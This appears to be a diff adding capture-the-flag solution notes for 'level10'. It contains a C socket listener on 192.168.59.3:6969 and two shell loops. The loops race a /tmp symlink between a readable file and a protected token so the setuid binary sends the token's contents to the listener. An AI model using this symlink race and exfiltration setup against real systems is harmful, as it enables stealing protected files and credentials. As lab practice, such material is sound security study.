@@ -1,0 +1,65 @@
+strings level10
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+int main() {
+    int sockfd, newsockfd;
+    socklen_t clilen;
+    char buffer[65];
+    struct sockaddr_in serv_addr, cli_addr;
+    int n;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Erreur à l'ouverture de la socket");
+        exit(1);
+    }
+
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = inet_addr("192.168.59.3");
+    serv_addr.sin_port = htons(6969);
+
+    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Erreur sur le bind");
+        exit(1);
+    }
+
+    listen(sockfd, 1);
+    printf("starting up on 192.168.59.3 port 6969\n");
+
+    clilen = sizeof(cli_addr);
+
+    while (1) {
+        printf("waiting for a connection\n");
+        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
+        if (newsockfd < 0) {
+            perror("Erreur sur l'accept");
+            continue;
+        }
+        printf("connection from %s\n", inet_ntoa(cli_addr.sin_addr));
+
+        while (1) {
+            memset(buffer, 0, 65);
+            n = read(newsockfd, buffer, 64);
+            if (n <= 0) {
+                close(newsockfd);
+                break;
+            }
+            printf("received \"%s\"\n", buffer);
+        }
+    }
+
+    close(sockfd);
+    return 0;
+}
+
+while true; do ln -fs ~/level10 /tmp/flag10; ln -fs ~/token /tmp/flag10; done
+
+while true; do ./level10 /tmp/flag10 192.168.59.3; done
